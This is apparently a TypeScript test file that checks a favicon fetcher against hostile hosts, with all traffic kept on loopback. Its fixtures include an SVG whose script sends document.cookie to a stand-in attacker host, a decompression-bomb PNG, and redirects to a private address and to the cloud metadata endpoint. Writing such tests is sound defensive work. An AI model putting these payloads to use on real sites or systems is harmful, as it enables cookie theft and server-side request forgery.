import { Socket } from "node:net";
import { randomBytes } from "node:crypto";
import { crc32, deflateSync } from "node:zlib";
import { fetchFavicon, type EgressPort, type EgressRequest, type FaviconFetchOutcome } from "@slugbase/core";
import sharp from "sharp";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi, type MockInstance } from "vitest";
import { HttpEgress, SharpImageCodec } from "../../src/index.ts";
import { startDnsStub, type DnsStub } from "../support/dns-stub.ts";
import { respond, startLocalServer, type Handler, type LocalServer } from "../support/local-http.ts";

// The favicon fetch of a host (doc 02 section 5.4, doc 08 section 3.5, doc 10 T6 and T14), run over the real egress adapter and the real image codec:
// `fetchFavicon` is what the `favicon.fetch` job calls. Nothing here reaches the internet: names resolve through a UDP DNS stub on loopback and every server listens on
// loopback; 127.0.0.1 stands in for a public address and 127.0.0.2 is the private address behind it that must never be reached. The fetch builds the default-port URLs of a
// host, which a test cannot listen on, so the port the adapter is given maps the host to the local server and changes nothing else about the request.
// The failure scenario: an SVG with a script, an image whose declared size is small but whose decoded size is enormous, a body over 64 KiB, an HTML page served as the icon
// and a redirect to a private address all end with no icon (`none`), and what the codec hands back for a real icon is a PNG it encoded itself.

let dns: DnsStub;
const servers: LocalServer[] = [];
let connect: MockInstance<Socket["connect"]>;

beforeAll(async () => {
  dns = await startDnsStub();
  dns.set("icons.test", ["127.0.0.1"]);
});

afterAll(async () => {
  await dns.close();
});

beforeEach(() => {
  connect = vi.spyOn(Socket.prototype, "connect");
});

afterEach(async () => {
  connect.mockRestore();
  await Promise.all(servers.splice(0).map((server) => server.close()));
});

async function serve(handler: Handler, host = "127.0.0.1", port = 0): Promise<LocalServer> {
  const server = await startLocalServer(handler, undefined, { host, port });
  servers.push(server);
  return server;
}

/** A server on 127.0.0.1 and another on 127.0.0.2 at the same port, so a redirect can point at the private one. */
async function servePair(onFirst: Handler, onSecond: Handler): Promise<[LocalServer, LocalServer]> {
  for (let attempt = 0; attempt < 10; attempt += 1) {
    const first = await serve(onFirst);
    try {
      return [first, await serve(onSecond, "127.0.0.2", first.port)];
    } catch {
      await first.close();
      servers.splice(servers.indexOf(first), 1);
    }
  }
  throw new Error("No free port on both loopback addresses");
}

function attempts(): string[] {
  return (connect.mock.calls as unknown[][]).map(([normalised]) => {
    const [options] = normalised as [{ host?: unknown; port?: unknown }];
    return `${String(options.host)}:${String(options.port)}`;
  });
}

/** The adapter that lets 127.0.0.1 stand in for a public address; every other address is still checked. */
const publicIsLoopback = (): HttpEgress => new HttpEgress({ nodeEnv: "test", testOnly: { dnsServers: [dns.server], allowAddresses: ["127.0.0.1"] } });

/** The egress port a test gives the fetch: the real adapter, with the default port of `icons.test` replaced by the port of the local server. */
function mapped(port: number): EgressPort & { readonly requested: string[] } {
  const inner = publicIsLoopback();
  const requested: string[] = [];
  return {
    available: true,
    requested,
    request: (request: EgressRequest) => {
      const url = new URL(request.url);
      requested.push(request.url);
      if (url.hostname === "icons.test" && url.port === "") {
        url.protocol = "http:";
        url.port = String(port);
      }
      return inner.request({ ...request, url: url.href });
    },
  };
}

function fetchIcon(egress: EgressPort): Promise<FaviconFetchOutcome> {
  return fetchFavicon({ egress, imageCodec: new SharpImageCodec() }, "icons.test");
}

const PNG_SIGNATURE = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

function chunk(type: string, data: Buffer): Buffer {
  const head = Buffer.alloc(8);
  head.writeUInt32BE(data.length, 0);
  head.write(type, 4, "ascii");
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(Buffer.concat([head.subarray(4), data])), 0);
  return Buffer.concat([head, data, crc]);
}

/** A PNG of `edge` by `edge` 8-bit gray pixels, all zero: a few kilobytes at any size. */
function grayPng(edge: number): Buffer {
  const header = Buffer.alloc(13);
  header.writeUInt32BE(edge, 0);
  header.writeUInt32BE(edge, 4);
  header[8] = 8;
  return Buffer.concat([PNG_SIGNATURE, chunk("IHDR", header), chunk("IDAT", deflateSync(Buffer.alloc(edge * (edge + 1)), { level: 9 })), chunk("IEND", Buffer.alloc(0))]);
}

/** A valid PNG of noise, `edge` by `edge`, which does not compress: well over 64 KiB at 160 pixels. */
const noisePng = (edge: number): Promise<Buffer> => sharp(randomBytes(edge * edge * 4), { raw: { width: edge, height: edge, channels: 4 } }).png().toBuffer();

const realIcon = (): Promise<Buffer> => sharp({ create: { width: 48, height: 48, channels: 4, background: { r: 20, g: 120, b: 220, alpha: 1 } } }).png().toBuffer();

const serveIcon =
  (contentType: string, body: Buffer | string): Handler =>
  (_request, socket) => {
    respond(socket, 200, { "content-type": contentType }, body);
  };

async function expectPng(png: Uint8Array, size: number): Promise<void> {
  expect(Buffer.from(png).subarray(0, 8).equals(PNG_SIGNATURE)).toBe(true);
  expect(await sharp(png).metadata()).toMatchObject({ format: "png", width: size, height: size });
}

describe("an icon the host serves", () => {
  it("is fetched through the adapter and returned as a 64 px and a 32 px PNG that the codec encoded", async () => {
    const source = await realIcon();
    const server = await serve(serveIcon("image/png", source));

    const outcome = await fetchIcon(mapped(server.port));

    expect(outcome.kind).toBe("ok");
    if (outcome.kind === "ok") {
      await expectPng(outcome.png64, 64);
      await expectPng(outcome.png32, 32);
      expect(Buffer.from(outcome.png64).equals(source)).toBe(false);
    }
    expect(server.requests.map((request) => request.target)).toEqual(["/favicon.ico"]);
    expect(server.requests[0]?.headers["accept"]).toContain("image/png");
    expect(attempts()).toEqual([`127.0.0.1:${String(server.port)}`]);
  });

  it("is found through the link rel=icon of the home page when /favicon.ico is not there", async () => {
    const source = await realIcon();
    const server = await serve((request, socket) => {
      if (request.target === "/") {
        respond(socket, 200, { "content-type": "text/html" }, '<html><head><link rel="icon" href="/img/logo.png"></head></html>');
      } else if (request.target === "/img/logo.png") {
        respond(socket, 200, { "content-type": "image/png" }, source);
      } else {
        respond(socket, 404, { "content-type": "text/html" }, "not found");
      }
    });

    const outcome = await fetchIcon(mapped(server.port));

    expect(outcome.kind).toBe("ok");
    expect(server.requests.map((request) => request.target)).toEqual(["/favicon.ico", "/favicon.ico", "/", "/img/logo.png"]);
  });
});

describe("what the host serves instead of an icon ends with no icon", () => {
  const SCRIPT_SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"><script>fetch("https://evil.test/?c="+document.cookie)</script><rect width="64" height="64"/></svg>';

  let oversized: Buffer;

  beforeAll(async () => {
    oversized = await noisePng(160);
  });

  const hostile: [string, () => Handler][] = [
    ["an SVG with a script, served as an SVG", () => serveIcon("image/svg+xml", SCRIPT_SVG)],
    ["an SVG with a script, served as a PNG", () => serveIcon("image/png", SCRIPT_SVG)],
    ["an SVG with a script, served as an ICO", () => serveIcon("image/x-icon", SCRIPT_SVG)],
    ["an HTML page served as the icon", () => serveIcon("text/html", "<html><script>alert(1)</script></html>")],
    ["an HTML page served with an image type", () => serveIcon("image/x-icon", "<html><script>alert(1)</script></html>")],
    ["a valid PNG over 64 KiB", () => serveIcon("image/png", oversized)],
    ["a small file whose decoded dimensions are enormous", () => serveIcon("image/png", grayPng(7_000))],
    ["an error page with an icon in it", () => (_request, socket) => {
      respond(socket, 500, { "content-type": "image/png" }, Buffer.from("x"));
    }],
  ];

  it.each(hostile)("%s", async (_name, handler) => {
    const server = await serve(handler());
    const egress = mapped(server.port);

    expect(await fetchIcon(egress)).toEqual({ kind: "none" });
    expect(egress.requested.length).toBeGreaterThan(0);
  });

  it("refuses the oversized PNG for its size alone: it is a valid icon that the codec accepts, and one just under the cap is fetched", async () => {
    expect(oversized.length).toBeGreaterThan(64 * 1024);
    await expect(new SharpImageCodec().reencodeIcon(oversized)).resolves.toBeDefined();
    const under = await noisePng(100);
    expect(under.length).toBeLessThan(64 * 1024);
    const server = await serve(serveIcon("image/png", under));

    expect((await fetchIcon(mapped(server.port))).kind).toBe("ok");
  });

  it("holds the file of the decompression bomb to the size cap the item names: it is under 64 KiB", () => {
    expect(grayPng(7_000).length).toBeLessThan(64 * 1024);
  });

  it("reads at most 64 KiB of a body that never ends and closes the connection", async () => {
    let written = 0;
    let closed: () => void = () => undefined;
    const serverSawClose = new Promise<void>((resolve) => {
      closed = resolve;
    });
    const endless = await serve((_request, socket) => {
      socket.on("close", closed);
      socket.write("HTTP/1.1 200 OK\r\ncontent-type: image/png\r\ntransfer-encoding: chunked\r\n\r\n");
      const piece = Buffer.alloc(8_192, 0x61);
      const writeChunk = (): void => {
        if (socket.destroyed) {
          return;
        }
        written += piece.length;
        const ok = socket.write(`${piece.length.toString(16)}\r\n`) && socket.write(piece) && socket.write("\r\n");
        if (ok) {
          setImmediate(writeChunk);
        } else {
          socket.once("drain", writeChunk);
        }
      };
      writeChunk();
    });

    expect(await fetchIcon(mapped(endless.port))).toEqual({ kind: "none" });
    await serverSawClose;

    expect(written).toBeLessThan(8 * 1024 * 1024);
  }, 30_000);

  it("is not served by following a redirect to a private address, and no connection reaches it", async () => {
    const [publicServer, privateServer] = await servePair(
      (_request, socket) => {
        respond(socket, 302, { location: "http://127.0.0.2:" + String(publicServer.port) + "/favicon.ico" });
      },
      serveIcon("image/png", await realIcon()),
    );

    const outcome = await fetchIcon(mapped(publicServer.port));

    expect(outcome).toEqual({ kind: "none" });
    expect(privateServer.requests).toEqual([]);
    expect(privateServer.connections()).toBe(0);
    expect(attempts().every((target) => target.startsWith("127.0.0.1:"))).toBe(true);
  });

  it("is not served by following a redirect to the metadata address, and no connection reaches it", async () => {
    const server = await serve((_request, socket) => {
      respond(socket, 302, { location: "http://169.254.169.254/latest/meta-data/" });
    });

    expect(await fetchIcon(mapped(server.port))).toEqual({ kind: "none" });

    expect(attempts().every((target) => target.startsWith("127.0.0.1:"))).toBe(true);
  });

  it("is not served from a link rel=icon that names a private address", async () => {
    const [publicServer, privateServer] = await servePair(
      (request, socket) => {
        if (request.target === "/") {
          respond(socket, 200, { "content-type": "text/html" }, `<link rel="icon" href="http://127.0.0.2:${String(publicServer.port)}/icon.png">`);
        } else {
          respond(socket, 404, { "content-type": "text/html" }, "no");
        }
      },
      serveIcon("image/png", await realIcon()),
    );

    expect(await fetchIcon(mapped(publicServer.port))).toEqual({ kind: "none" });

    expect(privateServer.connections()).toBe(0);
  });

  it("is none for a host that refuses every connection", async () => {
    const server = await serve(() => undefined);
    const port = server.port;
    await server.close();
    servers.splice(servers.indexOf(server), 1);

    expect(await fetchIcon(mapped(port))).toEqual({ kind: "none" });
  });
});
